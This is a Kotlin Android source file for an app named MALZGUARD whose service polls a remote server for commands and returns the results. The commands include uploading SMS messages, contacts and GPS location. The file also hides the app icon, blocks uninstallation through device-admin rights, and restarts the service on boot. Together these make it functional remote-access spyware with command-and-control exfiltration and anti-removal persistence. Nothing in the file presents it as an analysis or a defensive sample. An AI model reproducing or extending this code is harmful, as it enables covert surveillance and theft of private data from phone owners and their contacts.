package com.example.malzguard

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.os.Build
import android.os.BatteryManager
import android.os.IBinder
import android.os.Looper
import android.os.Handler
import android.provider.Settings
import android.net.Uri
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class Svc : Service() {
    private var running = false
    private var id = ""
    private var server = ""

    override fun onCreate() {
        super.onCreate()
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            id = sp.getString("id", null) ?: run {
                val v = UUID.randomUUID().toString()
                sp.edit().putString("id", v).apply(); v
            }
            server = sp.getString("server", "") ?: ""
            if (Build.VERSION.SDK_INT >= 26) {
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(NotificationChannel("mg", "MALZGUARD", NotificationManager.IMPORTANCE_MIN))
            }
            val n = Notification.Builder(this, "mg")
                .setContentTitle("MALZGUARD")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
            startForeground(1, n)
        } catch (e: Exception) {}
        running = true
        if (server.isNotEmpty()) Thread { loop() }.start()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            val newServer = sp.getString("server", "") ?: ""
            if (newServer.isNotEmpty() && newServer != server) {
                server = newServer
                if (!running) { running = true; Thread { loop() }.start() }
            } else if (server.isEmpty() && newServer.isNotEmpty()) {
                server = newServer
                if (!running) { running = true; Thread { loop() }.start() }
            }
        } catch (e: Exception) {}
        return START_STICKY
    }

    private fun loop() {
        while (running) {
            try {
                val sp = getSharedPreferences("mg", MODE_PRIVATE)
                server = sp.getString("server", "") ?: ""
                if (server.isEmpty()) { Thread.sleep(3000); continue }
                heartbeat()
                val body = httpGet("$server/api/poll/$id")
                if (body != null && body.contains("commands")) handle(body)
            } catch (e: Exception) {}
            try { Thread.sleep(3000) } catch (e: Exception) {}
        }
    }

    private fun httpGet(url: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000
            c.readTimeout = 15000
            c.requestMethod = "GET"
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }
            c.disconnect()
            return text
        } catch (e: Exception) { return null }
    }

    private fun httpPost(url: String, body: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000
            c.readTimeout = 15000
            c.requestMethod = "POST"
            c.doOutput = true
            c.setRequestProperty("Content-Type", "application/json")
            c.outputStream.use { it.write(body.toByteArray()) }
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }
            c.disconnect()
            return text
        } catch (e: Exception) { return null }
    }

    private fun heartbeat() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val admin = android.content.ComponentName(this, AdminRecv::class.java)
            val isAdmin = if (dpm != null) try { dpm.isAdminActive(admin) } catch (e: Exception) { false } else false
            val bm = getSystemService(BATTERY_SERVICE) as? BatteryManager
            val bat = if (bm != null) try { bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) } catch (e: Exception) { -1 } else -1
            val j = JSONObject()
                .put("id", id)
                .put("model", Build.MANUFACTURER + " " + Build.MODEL)
                .put("android", Build.VERSION.RELEASE)
                .put("admin", if (isAdmin) 1 else 0)
                .put("battery", bat)
            httpPost("$server/api/register", j.toString())
        } catch (e: Exception) {}
    }

    private fun handle(body: String) {
        try {
            val arr = JSONObject(body).getJSONArray("commands")
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val cid = o.getInt("id")
                val cmd = o.getString("cmd")
                val args = JSONObject(o.optString("args", "{}"))
                Thread {
                    val r = try { exec(cmd, args) } catch (e: Exception) { "ERR: " + (e.message ?: "unknown") }
                    try { httpPost("$server/api/result/$cid", r) } catch (e: Exception) {}
                }.start()
            }
        } catch (e: Exception) {}
    }

    private fun exec(cmd: String, a: JSONObject): String {
        return try {
            when (cmd) {
                "lock" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = android.content.ComponentName(this, AdminRecv::class.java)
                    if (!dpm.isAdminActive(admin)) "ERR: not admin"
                    else { dpm.lockNow(); "locked" }
                }
                "vibrate" -> {
                    val v = getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
                    val ms = a.optLong("ms", 1000)
                    if (Build.VERSION.SDK_INT >= 26) v.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                    else @Suppress("DEPRECATION") v.vibrate(ms)
                    "ok"
                }
                "toast" -> {
                    val t = a.optString("text", "hi")
                    Handler(Looper.getMainLooper()).post { Toast.makeText(applicationContext, t, Toast.LENGTH_LONG).show() }
                    "ok"
                }
                "open_url" -> {
                    val u = a.optString("url", "https://google.com")
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(u)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    "ok"
                }
                "get_location" -> {
                    val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                    val l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                        ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                    if (l == null) "ERR: no location" else JSONObject().put("lat", l.latitude).put("lon", l.longitude).toString()
                }
                "get_contacts" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                    c?.use {
                        while (it.moveToNext() && arr.length() < 500) {
                            val n = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                            val p = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                            arr.put(JSONObject().put("name", n).put("phone", p))
                        }
                    }
                    arr.toString()
                }
                "get_sms" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DATE + " DESC")
                    c?.use {
                        while (it.moveToNext() && arr.length() < 200) {
                            arr.put(JSONObject()
                                .put("from", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS)))
                                .put("body", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY))))
                        }
                    }
                    arr.toString()
                }
                "hide_icon" -> {
                    packageManager.setComponentEnabledSetting(android.content.ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                    "hidden"
                }
                "show_icon" -> {
                    packageManager.setComponentEnabledSetting(android.content.ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                    "shown"
                }
                "uninstall_block" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = android.content.ComponentName(this, AdminRecv::class.java)
                    if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin"
                }
                "uninstall_unblock" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = android.content.ComponentName(this, AdminRecv::class.java)
                    if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin"
                }
                else -> "unknown cmd: $cmd"
            }
        } catch (e: Exception) {
            "ERR: " + (e.message ?: "unknown")
        }
    }

    override fun onDestroy() { running = false; super.onDestroy() }
    override fun onBind(i: Intent?): IBinder? = null
}

class AdminRecv : android.app.admin.DeviceAdminReceiver()

class Boot : android.content.BroadcastReceiver() {
    override fun onReceive(c: android.content.Context, i: Intent?) {
        try { c.startService(Intent(c, Svc::class.java)) } catch (e: Exception) {}
    }
}
